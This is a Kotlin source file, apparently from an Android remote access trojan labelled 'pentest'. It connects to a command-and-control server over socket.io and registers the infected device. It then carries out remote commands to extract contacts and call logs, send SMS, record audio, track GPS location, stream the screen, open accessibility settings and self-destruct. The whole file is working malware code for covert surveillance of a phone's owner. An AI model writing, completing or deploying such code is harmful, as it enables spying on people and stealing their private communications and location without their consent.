package pentest.ratagentimport android.content.Intentimport android.os.Buildimport android.provider.Settingsimport io.socket.client.IOimport io.socket.client.Socketimport org.json.JSONObjectobject SocketManager {var socket: Socket? = null// Ahora usa la URL desde el objeto Configfun init(): Socket {socket = IO.socket(Config.SERVER_URL).apply {on("connect") {emit("register-agent", JSONObject().apply {put("agentId", "agent_${System.currentTimeMillis()}")put("deviceInfo", getDeviceInfo())})}on("command") { args ->val data = args[0] as JSONObjecthandleCommand(data)}connect()}return socket!!}private fun handleCommand(data: JSONObject) {// El dashboard envía el comando dentro de un objeto 'command'val commandType = data.optString("type")val context = RatService.instance ?: returnwhen (commandType) {"get_contacts" -> DataExtractor.getContacts(context)"get_call_logs" -> DataExtractor.getCallLogs(context)"send_sms" -> {val phone = data.optString("phone")val msg = data.optString("message")SmsTools.send(phone, msg)}"record_audio" -> {val duration = data.optInt("seconds", 10)AudioRecorder.record(context, duration)}"open_accessibility" -> {val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)}context.startActivity(intent)}"get_gps" -> GpsTracker.getLocation()"start_screen" -> ScreenStream.start() // Ejemplo"self_destruct" -> {// Lógica para desinstalar}}}private fun getDeviceInfo() = JSONObject().apply {put("model", Build.MODEL)put("android", Build.VERSION.RELEASE)}}